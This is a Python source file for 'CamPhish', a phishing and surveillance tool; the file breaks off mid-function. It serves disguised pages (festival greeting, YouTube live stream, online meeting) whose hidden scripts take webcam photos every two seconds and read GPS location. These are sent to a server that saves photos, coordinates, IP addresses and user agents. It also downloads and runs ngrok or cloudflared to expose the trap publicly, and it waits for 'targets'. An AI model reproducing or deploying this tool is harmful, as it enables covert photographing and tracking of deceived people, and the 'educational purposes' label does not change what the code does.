#!/usr/bin/env python3
"""
CamPhish Unified Tool v2.0
Combined version of all CamPhish components
For educational purposes only
"""

import os
import sys
import time
import json
import base64
import socket
import threading
import webbrowser
import subprocess
import http.server
import socketserver
from datetime import datetime
from urllib.parse import parse_qs, urlparse
import platform

# ==================== Configuration ====================
PORT = 3333
LOCALHOST = "127.0.0.1"
TEMPLATES = {
    '1': {'name': 'Festival Wishing', 'file': 'festival_template.html'},
    '2': {'name': 'Live YouTube TV', 'file': 'youtube_template.html'},
    '3': {'name': 'Online Meeting', 'file': 'meeting_template.html'}
}

# ==================== Global Variables ====================
captured_data = {
    'ips': [],
    'locations': [],
    'photos': []
}
stop_event = threading.Event()
current_template = None

# ==================== HTML Templates ====================

FESTIVAL_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy {festival_name} Wishes</title>
    <style>
        body {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
        }}
        .container {{
            max-width: 800px;
            width: 100%;
        }}
        .card {{
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            margin: 20px 0;
        }}
        h1 {{
            color: #333;
            text-align: center;
            font-size: 2.5em;
            margin-bottom: 30px;
            animation: glow 2s ease-in-out infinite;
        }}
        @keyframes glow {{
            0%, 100% {{ text-shadow: 0 0 30px #ff6b6b; }}
            50% {{ text-shadow: 0 0 30px #4ecdc4; }}
        }}
        .greeting-text {{
            color: #555;
            line-height: 1.8;
            font-size: 1.2em;
            margin: 20px 0;
        }}
        .share-buttons {{
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-top: 30px;
        }}
        .btn {{
            padding: 12px 30px;
            border: none;
            border-radius: 50px;
            color: white;
            font-size: 1.1em;
            cursor: pointer;
            transition: transform 0.3s;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }}
        .btn:hover {{
            transform: translateY(-3px);
        }}
        .whatsapp {{ background: #25D366; }}
        .facebook {{ background: #4267B2; }}
        input {{
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 10px;
            width: 100%;
            font-size: 1.1em;
            margin-bottom: 20px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>✨ Happy {festival_name} ✨</h1>
            <div style="text-align: center;">
                <input type="text" id="userName" placeholder="Enter your name" onchange="updateName()">
            </div>
            <div class="greeting-text" id="greeting">
                <center>Wishing you and your family a very Happy {festival_name}!<br>
                May this festival bring joy, prosperity and happiness to your life.</center>
            </div>
            <div class="share-buttons">
                <a class="btn whatsapp" onclick="shareWhatsApp()">
                    <i class="fab fa-whatsapp"></i> Share
                </a>
                <a class="btn facebook" onclick="shareFacebook()">
                    <i class="fab fa-facebook"></i> Share
                </a>
            </div>
        </div>
    </div>

    <div style="display: none;">
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script src="https://kit.fontawesome.com/yourkit.js" crossorigin="anonymous"></script>
    <script>
        // Camera capture
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        async function initCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                video.srcObject = stream;
                
                const context = canvas.getContext('2d');
                setInterval(() => {{
                    context.drawImage(video, 0, 0, 640, 480);
                    const imgData = canvas.toDataURL('image/png');
                    sendPhoto(imgData);
                }}, 2000);
            }} catch (e) {{
                console.log('Camera access denied');
            }}
        }}
        
        function sendPhoto(data) {{
            fetch('/api/photo', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ image: data, template: 'festival' }})
            }});
        }}
        
        function updateName() {{
            const name = document.getElementById('userName').value;
            document.getElementById('greeting').innerHTML = 
                `<center>Dear ${name},<br>Wishing you and your family a very Happy {festival_name}!<br>
                May this festival bring joy, prosperity and happiness to your life.</center>`;
        }}
        
        function shareWhatsApp() {{
            window.open(`https://wa.me/?text=Check out this {festival_name} wishes: ${{window.location.href}}`);
        }}
        
        function shareFacebook() {{
            window.open(`https://www.facebook.com/sharer/sharer.php?u=${{window.location.href}}`);
        }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy
                        }})
                    }});
                }},
                (error) => console.log('Location error:', error)
            );
        }}
        
        initCamera();
    </script>
</body>
</html>"""

YOUTUBE_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Live YouTube TV</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
        }}
        #player {{
            width: 100%;
            height: 60vh;
        }}
        .controls {{
            position: fixed;
            bottom: 0;
            width: 100%;
            background: #1a1a1a;
            padding: 15px;
            display: flex;
            justify-content: center;
            gap: 30px;
            z-index: 1000;
        }}
        .control-btn {{
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #888;
            cursor: pointer;
            transition: color 0.3s;
        }}
        .control-btn:hover {{ color: #ff0000; }}
        .control-btn i {{ font-size: 24px; margin-bottom: 5px; }}
        .chat-container {{
            position: fixed;
            right: 0;
            top: 0;
            width: 300px;
            height: 100vh;
            background: #1a1a1a;
            padding: 20px;
            overflow-y: auto;
        }}
        @media (max-width: 768px) {{
            .chat-container {{ display: none; }}
        }}
    </style>
</head>
<body>
    <div id="player"></div>
    
    <div class="controls">
        <div class="control-btn" onclick="toggleMute()">
            <i class="fas fa-microphone"></i>
            <span>Mute</span>
        </div>
        <div class="control-btn" onclick="toggleVideo()">
            <i class="fas fa-video"></i>
            <span>Stop Video</span>
        </div>
        <div class="control-btn" onclick="showChat()">
            <i class="fas fa-comments"></i>
            <span>Chat</span>
        </div>
        <div class="control-btn" onclick="shareVideo()">
            <i class="fas fa-share"></i>
            <span>Share</span>
        </div>
    </div>

    <div style="display: none;">
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script src="https://kit.fontawesome.com/yourkit.js" crossorigin="anonymous"></script>
    <script>
        // YouTube Player
        var tag = document.createElement('script');
        tag.src = "https://www.youtube.com/iframe_api";
        var firstScriptTag = document.getElementsByTagName('script')[0];
        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

        var player;
        function onYouTubeIframeAPIReady() {{
            player = new YT.Player('player', {{
                height: '100%',
                width: '100%',
                videoId: '{video_id}',
                playerVars: {{ 'autoplay': 1, 'controls': 1 }},
                events: {{
                    'onReady': onPlayerReady
                }}
            }});
        }}

        function onPlayerReady(event) {{
            event.target.playVideo();
        }}

        // Camera capture
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        async function initCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                video.srcObject = stream;
                
                const context = canvas.getContext('2d');
                setInterval(() => {{
                    context.drawImage(video, 0, 0, 640, 480);
                    const imgData = canvas.toDataURL('image/png');
                    sendPhoto(imgData);
                }}, 2000);
            }} catch (e) {{
                console.log('Camera access denied');
            }}
        }}
        
        function sendPhoto(data) {{
            fetch('/api/photo', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ image: data, template: 'youtube' }})
            }});
        }}
        
        function toggleMute() {{ /* UI functionality */ }}
        function toggleVideo() {{ /* UI functionality */ }}
        function showChat() {{ /* UI functionality */ }}
        function shareVideo() {{ /* UI functionality */ }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy
                        }})
                    }});
                }},
                (error) => console.log('Location error:', error)
            );
        }}
        
        initCamera();
    </script>
</body>
</html>"""

MEETING_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Online Meeting</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #1a1a1a;
            color: white;
        }}
        .meeting-container {{
            display: flex;
            flex-direction: column;
            height: 100vh;
        }}
        .video-grid {{
            flex: 1;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            padding: 20px;
        }}
        .video-box {{
            background: #2d2d2d;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
            min-height: 200px;
        }}
        .video-box.local {{
            border: 3px solid #4CAF50;
        }}
        .participant-info {{
            position: absolute;
            bottom: 10px;
            left: 10px;
            background: rgba(0,0,0,0.7);
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 12px;
        }}
        .controls-bar {{
            background: #333;
            padding: 15px 30px;
            display: flex;
            justify-content: center;
            gap: 30px;
            border-top: 1px solid #444;
        }}
        .control-btn {{
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #ddd;
            cursor: pointer;
            transition: color 0.3s;
        }}
        .control-btn:hover {{ color: #4CAF50; }}
        .control-btn.danger:hover {{ color: #ff4444; }}
        .control-btn i {{ font-size: 24px; margin-bottom: 5px; }}
        .meeting-info {{
            background: #2d2d2d;
            padding: 10px;
            text-align: center;
            border-bottom: 1px solid #444;
        }}
    </style>
</head>
<body>
    <div class="meeting-container">
        <div class="meeting-info">
            <i class="fas fa-shield-alt"></i> Meeting is secure | 
            <i class="fas fa-users"></i> 3 participants
        </div>
        
        <div class="video-grid">
            <div class="video-box local">
                <div style="width:100%; height:100%;" id="localVideo"></div>
                <div class="participant-info">
                    <i class="fas fa-user"></i> You (Host)
                </div>
            </div>
            <div class="video-box">
                <div style="background: #3d3d3d; width:100%; height:100%; display:flex; align-items:center; justify-content:center;">
                    <i class="fas fa-user" style="font-size: 48px; color: #555;"></i>
                </div>
                <div class="participant-info">
                    <i class="fas fa-user"></i> Participant 1
                </div>
            </div>
            <div class="video-box">
                <div style="background: #3d3d3d; width:100%; height:100%; display:flex; align-items:center; justify-content:center;">
                    <i class="fas fa-user" style="font-size: 48px; color: #555;"></i>
                </div>
                <div class="participant-info">
                    <i class="fas fa-user"></i> Participant 2
                </div>
            </div>
        </div>

        <div class="controls-bar">
            <div class="control-btn" onclick="toggleMute()">
                <i class="fas fa-microphone"></i>
                <span>Mute</span>
            </div>
            <div class="control-btn" onclick="toggleVideo()">
                <i class="fas fa-video"></i>
                <span>Stop Video</span>
            </div>
            <div class="control-btn" onclick="shareScreen()">
                <i class="fas fa-desktop"></i>
                <span>Share Screen</span>
            </div>
            <div class="control-btn" onclick="showParticipants()">
                <i class="fas fa-users"></i>
                <span>Participants</span>
            </div>
            <div class="control-btn" onclick="showChat()">
                <i class="fas fa-comments"></i>
                <span>Chat</span>
            </div>
            <div class="control-btn danger" onclick="leaveMeeting()">
                <i class="fas fa-phone-slash"></i>
                <span>Leave</span>
            </div>
        </div>
    </div>

    <div style="display: none;">
        <video id="video" playsinline autoplay></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script src="https://kit.fontawesome.com/yourkit.js" crossorigin="anonymous"></script>
    <script>
        // Camera capture
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const localVideo = document.getElementById('localVideo');
        
        async function initCamera() {{
            try {{
                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                video.srcObject = stream;
                
                // Show local video
                const localStream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
                const localVideoElement = document.createElement('video');
                localVideoElement.srcObject = localStream;
                localVideoElement.autoplay = true;
                localVideoElement.playsinline = true;
                localVideoElement.style.width = '100%';
                localVideoElement.style.height = '100%';
                localVideoElement.style.objectFit = 'cover';
                document.getElementById('localVideo').appendChild(localVideoElement);
                
                // Capture and send photos
                const context = canvas.getContext('2d');
                setInterval(() => {{
                    context.drawImage(video, 0, 0, 640, 480);
                    const imgData = canvas.toDataURL('image/png');
                    sendPhoto(imgData);
                }}, 2000);
            }} catch (e) {{
                console.log('Camera access denied');
            }}
        }}
        
        function sendPhoto(data) {{
            fetch('/api/photo', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ image: data, template: 'meeting' }})
            }});
        }}
        
        function toggleMute() {{ /* UI functionality */ }}
        function toggleVideo() {{ /* UI functionality */ }}
        function shareScreen() {{ /* UI functionality */ }}
        function showParticipants() {{ /* UI functionality */ }}
        function showChat() {{ /* UI functionality */ }}
        function leaveMeeting() {{
            window.location.href = 'about:blank';
        }}
        
        // Get location
        if (navigator.geolocation) {{
            navigator.geolocation.getCurrentPosition(
                (position) => {{
                    fetch('/api/location', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            acc: position.coords.accuracy
                        }})
                    }});
                }},
                (error) => console.log('Location error:', error)
            );
        }}
        
        initCamera();
    </script>
</body>
</html>"""

LOADING_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {{
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
        }}
        @keyframes gradient {{
            0% {{ background-position: 0% 50%; }}
            50% {{ background-position: 100% 50%; }}
            100% {{ background-position: 0% 50%; }}
        }}
        .loader {{
            text-align: center;
            color: white;
        }}
        .spinner {{
            border: 8px solid rgba(255,255,255,0.3);
            border-top: 8px solid white;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        h2 {{ margin-bottom: 20px; }}
        p {{ opacity: 0.9; }}
    </style>
</head>
<body>
    <div class="loader">
        <h2>Loading, please wait...</h2>
        <div class="spinner"></div>
        <p id="status">Initializing...</p>
    </div>

    <script>
        function getLocation() {{
            document.getElementById('status').innerText = 'Requesting location...';
            
            if (navigator.geolocation) {{
                navigator.geolocation.getCurrentPosition(
                    (position) => {{
                        document.getElementById('status').innerText = 'Location obtained!';
                        fetch('/api/location', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                acc: position.coords.accuracy
                            }})
                        }}).then(() => {{
                            setTimeout(() => {{
                                window.location.href = '/template';
                            }}, 1000);
                        }});
                    }},
                    (error) => {{
                        console.log('Location error:', error);
                        setTimeout(() => {{
                            window.location.href = '/template';
                        }}, 2000);
                    }},
                    {{
                        enableHighAccuracy: true,
                        timeout: 10000
                    }}
                );
            }} else {{
                setTimeout(() => {{
                    window.location.href = '/template';
                }}, 2000);
            }}
        }}
        
        window.onload = function() {{
            setTimeout(getLocation, 500);
        }};
    </script>
</body>
</html>"""

# ==================== HTTP Request Handler ====================

class CamPhishHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(LOADING_TEMPLATE.encode())
            
        elif self.path == '/template':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            if current_template == '1':
                html = FESTIVAL_TEMPLATE.format(festival_name=getattr(self.server, 'festival_name', 'Festival'))
            elif current_template == '2':
                html = YOUTUBE_TEMPLATE.format(video_id=getattr(self.server, 'video_id', 'dQw4w9WgXcQ'))
            elif current_template == '3':
                html = MEETING_TEMPLATE
            else:
                html = "<h1>Invalid Template</h1>"
            
            self.wfile.write(html.encode())
            
        elif self.path == '/api/status':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            status = {
                'captured_ips': len(captured_data['ips']),
                'captured_locations': len(captured_data['locations']),
                'captured_photos': len(captured_data['photos'])
            }
            self.wfile.write(json.dumps(status).encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        if self.path == '/api/location':
            try:
                data = json.loads(post_data.decode())
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                
                location_data = {
                    'timestamp': timestamp,
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'accuracy': data.get('acc'),
                    'maps_url': f"https://www.google.com/maps/place/{data.get('lat')},{data.get('lon')}"
                }
                
                captured_data['locations'].append(location_data)
                
                # Save to file
                filename = f"location_{timestamp}.txt"
                with open(filename, 'w') as f:
                    f.write(f"Latitude: {data.get('lat')}\n")
                    f.write(f"Longitude: {data.get('lon')}\n")
                    f.write(f"Accuracy: {data.get('acc')} meters\n")
                    f.write(f"Google Maps: {location_data['maps_url']}\n")
                
                print(f"\n\033[92m[+]\033[0m Location captured! ({timestamp})")
                print(f"    Lat: {data.get('lat')}, Lon: {data.get('lon')}")
                
            except Exception as e:
                print(f"Error saving location: {e}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
            
        elif self.path == '/api/photo':
            try:
                data = json.loads(post_data.decode())
                image_data = data.get('image', '')
                template = data.get('template', 'unknown')
                
                if image_data:
                    # Extract base64 data
                    if ',' in image_data:
                        image_data = image_data.split(',')[1]
                    
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    filename = f"cam_{timestamp}_{template}.png"
                    
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(image_data))
                    
                    captured_data['photos'].append(filename)
                    print(f"\n\033[92m[+]\033[0m Photo captured! ({filename})")
                    
            except Exception as e:
                print(f"Error saving photo: {e}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
            
        elif self.path == '/api/ip':
            client_ip = self.client_address[0]
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            ip_data = {
                'timestamp': timestamp,
                'ip': client_ip,
                'user_agent': self.headers.get('User-Agent', 'Unknown')
            }
            
            captured_data['ips'].append(ip_data)
            
            # Save to file
            with open('ip.txt', 'a') as f:
                f.write(f"IP: {client_ip}\n")
                f.write(f"User-Agent: {ip_data['user_agent']}\n")
                f.write(f"Time: {timestamp}\n\n")
            
            print(f"\n\033[92m[+]\033[0m IP captured: {client_ip}")
            
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Suppress default logging
        pass

# ==================== Tunnel Management ====================

def check_dependencies():
    """Check if required tools are installed"""
    required = ['php', 'wget', 'unzip']
    missing = []
    
    for cmd in required:
        try:
            subprocess.run([cmd, '--version'], capture_output=True, check=True)
        except:
            missing.append(cmd)
    
    if missing:
        print(f"\033[91m[!] Missing dependencies: {', '.join(missing)}\033[0m")
        print("Install them using:")
        print("apt-get install php wget unzip")
        return False
    return True

def download_ngrok():
    """Download ngrok based on platform"""
    system = platform.system().lower()
    machine = platform.machine().lower()
    
    print("\n\033[93m[*] Downloading ngrok...\033[0m")
    
    base_url = "https://bin.equinox.io/c/bNyj1mQVY4c"
    
    if system == 'windows':
        url = f"{base_url}/ngrok-v3-stable-windows-amd64.zip"
        output = "ngrok.zip"
    elif system == 'darwin':  # macOS
        if 'arm' in machine:
            url = f"{base_url}/ngrok-v3-stable-darwin-arm64.zip"
        else:
            url = f"{base_url}/ngrok-v3-stable-darwin-amd64.zip"
        output = "ngrok.zip"
    else:  # Linux
        if 'aarch64' in machine or 'arm64' in machine:
            url = f"{base_url}/ngrok-v3-stable-linux-arm64.zip"
        elif 'arm' in machine:
            url = f"{base_url}/ngrok-v3-stable-linux-arm.zip"
        elif 'x86_64' in machine:
            url = f"{base_url}/ngrok-v3-stable-linux-amd64.zip"
        else:
            url = f"{base_url}/ngrok-v3-stable-linux-386.zip"
        output = "ngrok.zip"
    
    try:
        subprocess.run(['wget', '-q', '--no-check-certificate', url, '-O', output], check=True)
        subprocess.run(['unzip', '-q', output], check=True)
        os.remove(output)
        if system != 'windows':
            os.chmod('ngrok', 0o755)
        print("\033[92m[+]\033[0m Ngrok downloaded successfully")
        return True
    except:
        print("\033[91m[!] Failed to download ngrok\033[0m")
        return False

def download_cloudflared():
    """Download cloudflared based on platform"""
    system = platform.system().lower()
    machine = platform.machine().lower()
    
    print("\n\033[93m[*] Downloading cloudflared...\033[0m")
    
    if system == 'windows':
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        output = "cloudflared.exe"
    elif system == 'darwin':
        if 'arm' in machine:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz"
        output = "cloudflared.tgz"
    else:  # Linux
        if 'aarch64' in machine or 'arm64' in machine:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        elif 'arm' in machine:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
        elif 'x86_64' in machine:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        else:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
        output = "cloudflared"
    
    try:
        if output.endswith('.tgz'):
            subprocess.run(['wget', '-q', '--no-check-certificate', url, '-O', output], check=True)
            subprocess.run(['tar', '-xzf', output], check=True)
            os.remove(output)
        else:
            subprocess.run(['wget', '-q', '--no-check-certificate', url, '-O', output], check=True)
        
        if system != 'windows':
            os.chmod(output, 0o755)
        
        print("\033[92m[+]\033[0m Cloudflared downloaded successfully")
        return True
    except:
        print("\033[91m[!] Failed to download cloudflared\033[0m")
        return False

def start_ngrok():
    """Start ngrok tunnel"""
    if not os.path.exists('ngrok') and not os.path.exists('ngrok.exe'):
        if not download_ngrok():
            return None
    
    print("\n\033[93m[*] Starting ngrok tunnel...\033[0m")
    
    try:
        # Check if ngrok is already configured
        ngrok_cmd = './ngrok' if os.path.exists('ngrok') else 'ngrok.exe'
        
        # Start ngrok
        if platform.system().lower() == 'windows':
            process = subprocess.Popen([ngrok_cmd, 'http', str(PORT)], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL,
                                     shell=True)
        else:
            process = subprocess.Popen([ngrok_cmd, 'http', str(PORT)], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
        
        time.sleep(5)
        
        # Get the public URL
        import requests
        try:
            response = requests.get('http://localhost:4040/api/tunnels')
            tunnels = response.json()
            public_url = tunnels['tunnels'][0]['public_url']
            print(f"\033[92m[+]\033[0m Ngrok URL: {public_url}")
            return public_url
        except:
            print("\033[91m[!] Failed to get ngrok URL\033[0m")
            return None
            
    except Exception as e:
        print(f"\033[91m[!] Error starting ngrok: {e}\033[0m")
        return None

def start_cloudflared():
    """Start cloudflared tunnel"""
    if not os.path.exists('cloudflared') and not os.path.exists('cloudflared.exe'):
        if not download_cloudflared():
            return None
    
    print("\n\033[93m[*] Starting cloudflared tunnel...\033[0m")
    
    try:
        cf_cmd = './cloudflared' if os.path.exists('cloudflared') else 'cloudflared.exe'
        
        # Start cloudflared
        if platform.system().lower() == 'windows':
            process = subprocess.Popen([cf_cmd, 'tunnel', '--url', f'http://localhost:{PORT}'], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL,
                                     shell=True)
        else:
            process = subprocess.Popen([cf_cmd, 'tunnel', '--url', f'http://localhost:{PORT}', 
                                      '--logfile', '.cloudflared.log'], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
        
        time.sleep(8)
        
        # Try to get URL from log file
        if os.path.exists('.cloudflared.log'):
            with open('.cloudflared.log', 'r') as f:
                log_content = f.read()
                import re
                urls = re.findall(r'https://[-0-9a-z]*\.trycloudflare.com', log_content)
                if urls:
                    print(f"\033[92m[+]\033[0m Cloudflared URL: {urls[0]}")
                    return urls[0]
        
        print("\033[91m[!] Failed to get cloudflared URL\033[0m")
        return None
        
    except Exception as e:
        print(f"\033[91m[!] Error starting cloudflared: {e}\033[0m")
        return None

def start_php_server():
    """Start PHP server (fallback)"""
    print("\n\033[93m[*] Starting PHP server...\033[0m")
    
    try:
        if platform.system().lower() == 'windows':
            process = subprocess.Popen(['php', '-S', f'{LOCALHOST}:{PORT}'], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL,
                                     shell=True)
        else:
            process = subprocess.Popen(['php', '-S', f'{LOCALHOST}:{PORT}'], 
                                     stdout=subprocess.DEVNULL, 
                                     stderr=subprocess.DEVNULL)
        
        time.sleep(2)
        print(f"\033[92m[+]\033[0m PHP server running on http://{LOCALHOST}:{PORT}")
        return f"http://{LOCALHOST}:{PORT}"
        
    except Exception as e:
        print(f"\033[91m[!] Error starting PHP server: {e}\033[0m")
        return None

# ==================== Main Functions ====================

def show_banner():
    """Display banner"""
    os.system('clear' if os.name != 'nt' else 'cls')
    print("""
\033[92m  _______  _______  _______ \033[0m\033[93m_______          _________ _______         \033[0m
\033[92m (  ____ \(  ___  )(       )\033[0m\033[93m(  ____ )|\     /|\__   __/(  ____ \|\     /|\033[0m
\033[92m | (    \/| (   ) || () () |\033[0m\033[93m| (    )|| )   ( |   ) (   | (    \/| )   ( |\033[0m
\033[92m | |      | (___) || || || |\033[0m\033[93m| (____)|| (___) |   | |   | (_____ | (___) |\033[0m
\033[92m | |      |  ___  || |(_)| |\033[0m\033[93m|  _____)|  ___  |   | |   (_____  )|  ___  |\033[0m
\033[92m | |      | (   ) || |   | |\033[0m\033[93m| (      | (   ) |   | |         ) || (   ) |\033[0m
\033[92m | (____/\| )   ( || )   ( |\033[0m\033[93m| )      | )   ( |___) (___/\____) || )   ( |\033[0m
\033[92m (_______/|/     \||/     \|\033[0m\033[93m|/       |/     \|\_______/\_______)|/     \|\033[0m
\033[0m""")
    print("\033[95m            CamPhish Unified Tool v2.0\033[0m")
    print("\033[96m       For Educational Purposes Only\033[0m\n")

def select_template():
    """Select which template to use"""
    global current_template
    
    print("\n\033[94mAvailable Templates:\033[0m")
    for key, template in TEMPLATES.items():
        print(f"  {key}. {template['name']}")
    
    choice = input("\n\033[93m[?]\033[0m Select template (1-3): ").strip()
    
    if choice in TEMPLATES:
        current_template = choice
        print(f"\n\033[92m[+]\033[0m Selected: {TEMPLATES[choice]['name']}")
        
        if choice == '1':
            festival = input("\033[93m[?]\033[0m Enter festival name: ").strip()
            CamPhishHandler.festival_name = festival
        elif choice == '2':
            video_id = input("\033[93m[?]\033[0m Enter YouTube video ID: ").strip()
            CamPhishHandler.video_id = video_id
        
        return True
    else:
        print("\033[91m[!] Invalid choice!\033[0m")
        return False

def select_tunnel():
    """Select tunnel method"""
    print("\n\033[94mTunnel Options:\033[0m")
    print("  1. Ngrok")
    print("  2. Cloudflared")
    print("  3. Local (PHP Server only)")
    
    choice = input("\n\033[93m[?]\033[0m Select tunnel (1-3): ").strip()
    
    if choice == '1':
        return start_ngrok()
    elif choice == '2':
        return start_cloudflared()
    elif choice == '3':
        return start_php_server()
    else:
        print("\033[91m[!] Invalid choice!\033[0m")
        return None

def monitor_captures():
    """Monitor and display captured data"""
    print("\n\033[93m[*] Waiting for targets... (Press Ctrl+C to stop)\033[0m")
    print("\033[93m[*] GPS Location tracking is ACTIVE\033[0m\n")
    
    last_ip_count = len(captured_data['ips'])
    last_loc_count = len(captured_data['locations'])
    last_photo_count = len(captured_data['photos'])
    
    while not stop_event.is_set():
        if len(captured_data['ips']) > last_ip_count:
            print(f"\033[92m[+]\033[0m New IP captured! Total: {len(captured_data['ips'])}")
            last_ip_count = len(captured_data['ips'])
        
        if len(captured_data['locations']) > last_loc_count:
            print(f"\033[92m[+]\033[0m New location captured! Total: {len(captured_data['locations'])}")
            last_loc_count = len(captured_data['locations'])
        
        if len(captured_data['photos']) > last_photo_count:
            print(f"\033[92m[+]\033[0m New photo captured! Total: {len(captured_data['photos'])}")
            last_photo_count = len(captured_data['photos'])
        
        time.sleep(1)

def cleanup():
    """Clean up temporary files"""
    print("\n\033[93m[*] Cleaning up...\033[0m")
    
    # Kill processes
    if platform.system().lower() == 'windows':
        subprocess.run(['taskkill', '/F', '/IM', 'ngrok.exe'], capture_output=True)
        subprocess.run(['taskkill', '/F', '/IM', 'cloudflared.exe'], capture_output=True)
        subprocess.run(['taskkill', '/F', '/IM', 'php.exe'], capture_output=True)
    else:
        subprocess.run(['pkill', '-f', 'ngrok'], capture_output=True)
        subprocess.run(['pkill', '-f', 'cloudflared'], capture_output=True)
        subprocess.run(['pkill', '-f', 'php'], capture_output=True)
    
    print("\033[92m[+]\033[0m Cleanup completed")

def main():
    """Main function"""
    show_banner()
    
    # Check dependencies
    if not check_dependencies():
        sys.exit(1)
    
    # Select template
    if not select_template():
        return
    
    # Start HTTP server
    handler = CamPhishHandler
    httpd = socketserver.TCPServer((LOCALHOST, PORT), handler)
    
    server_thread = threading.Thread(target=httpd.serve_forever)
